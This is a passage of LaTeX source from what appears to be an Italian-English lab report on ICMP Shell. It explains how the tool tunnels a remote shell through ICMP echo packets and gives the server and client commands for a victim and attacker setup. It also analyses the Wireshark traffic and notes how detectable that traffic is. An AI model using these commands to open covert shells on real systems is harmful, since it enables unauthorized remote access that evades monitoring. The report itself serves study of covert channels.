%https://icmpshell.sourceforge.net/ 

ICMP Shell (ISH) allows users to connect to a remote host and to open a shell using only ICMP to send and receive data. 
ICMP Shell was written in C for the UNIX environment.

\subsection{How does it work?}
The ISHELL server is run in daemon mode on the remote server. 
When the server recieves a request from the client it will strip the header and look at the ID field, 
if it matches the server then it will pipe the data to "/bin/sh". 
It will then read the results from the pipe and send them back to the client and 
the client prints the results to stdout.
\vspace{1ex} \newline
By default the client and server send packets with an ICMP type of 0 (ICMP\_ECHO\_REPLY), however this can be changed on both the client and server side. 
ISHELL does not care what type you send out from the client or server end, the types do not have to match.
\vspace{1ex} \newline
ISHELL does not only pipe commands to a server and send back the output. 
It also works with interactive programs (ie. gdb). 
However, there comes a minor problem from this. ISHELL cannot display a shell prompt (\#). 
The reason for that is because there is no way to differentiate between a command an interaction with a program. 
\vspace{4ex} \newline


By default ISHELL uses icmp type 0 (ICMP\_ECHO\_REPLY) to send/recv. 
%With a little bit of research I have found that icmp type 0 works best with this program. 
Other types do work, however some kernels process ICMP\_ECHO\_REQUEST packets automatically (BSD) while others do not (Linux).




Some IMPORTANT words on the usage
\begin{enumerate}
    \item  ISHELL uses raw sockets on both the client and server side, therefore root privileges ARE REQUIRED to use this program.
    \item When configuring the options for the server/client make sure the following options are the same on both 
    the client and the server:
    -i $<\text{id}>$
    -p $<\text{packetsize}>$
\end{enumerate}

\subsection{Setting up}
Il server verrà eseguito sulla machciona della vittima. 
Per impostarlo eseguiamo il comando: 
\begin{lstlisting}
    ./ishd [options]

    #Comando per attivare il server (la vittima)
    sudo ./ishd -t 0 -p 1024
\end{lstlisting} 
\captionof{lstlisting}{Comando per attivare il server}
\label{lstlisting:script:server}
\vspace{1ex} 
And the available options are:
\begin{itemize}
    \item h Display this screen
    \item d Run server in debug mode
    \item i $<\text{id}>$ Set session id; range: 0-65535 (default: 1515)
    \item t $<\text{type}>$ Set ICMP type (default: 0)
    \item p $<\text{packetsize}>$ Set packet size (default: 512)
\end{itemize}
%./ishd -i 65535 -t 0 -p 1024
\vspace{1ex} 
Invece il client verrà eseguito sulla macchina dell'attaccante.
Per impostarlo eseguiamo il comando:
\begin{lstlisting}
    ./ish [options] <host>

    #Comando per attivare il client
    sudo ./ish -t 0 -p 1024 192.168.1.42
\end{lstlisting} 
\captionof{lstlisting}{Comando per attivare il client}
\label{lstlisting:script:client}
\vspace{1ex} 
And the available options are: 
\begin{itemize}
    \item i $<\text{id}>$ Set session id; range: 0-65535 (default: 1515)
    \item t $<\text{type}>$ Set ICMP type (default: 0)
    \item p $<\text{packetsize}>$ Set packet size (default: 512)
\end{itemize}
%./ish -i 65535 -t 0 -p 1024 host.com
\vspace{1ex} 
Eseguiamo i comandi per attivare la comunicaizone e così che l'attaccante e la vittima siano in comunicazione. 
D'ora in poi riusciremo ad eseguire dei comandi sulla macchina della vittima il cui output verrà poi trasmesso all'attaccante (Fig.\ref{fig:icmpShell:creazionefile}). 
\vspace{1ex} \newline
\begin{minipage}{\linewidth}
    \centering
    \captionof{figure}{Creazione del file \textit{prova.txt}}
    \includegraphics[width=0.8\linewidth]{../img/ICMPshell/creazione_file.png} 
    \label{fig:icmpShell:creazionefile}
\end{minipage}
\vspace{2ex} \newline
\begin{minipage}{\linewidth}
    \centering
    \captionof{figure}{Traffico ICMP per la creazione del file}
    \includegraphics[width=0.6\linewidth]{../img/ICMPshell/example_echoFile_request.jpg}  
    \label{fig:wireshark:creazionefile}
\end{minipage}
%
\vspace{3ex} \newline
Proviamo ora a visualizzare un file di grandi dimensioni per vedere il comportamento del programma. 
\begin{itemize}
    \item Dopo la richiesta vengono trasmesse undici Echo Reply (contenenti i dati del file), tutte di dimensioni uguali tranne che per l'ultima.
\end{itemize}
Questo numero elevsto di risposte potrebbe far notare la natura illecita della comunicazione.
\vspace{1ex} \newline
\begin{minipage}{0.5\linewidth}
    \centering
    \includegraphics[width=\linewidth]{../img/ICMPshell/example_hugefile_request.jpg} 
    \captionof{figure}{Traffico ICMP per la richiesta del file}
    \label{fig:wireshark:hugefile:request}
\end{minipage}
\hspace{1ex}
\begin{minipage}{0.5\linewidth}
    \centering
    \includegraphics[width=\linewidth]{../img/ICMPshell/example_hugefile_reply.jpg} 
    \captionof{figure}{Traffico ICMP per la visualizzazione del file}
    \label{fig:wireshark:hugefile:reply}
\end{minipage}






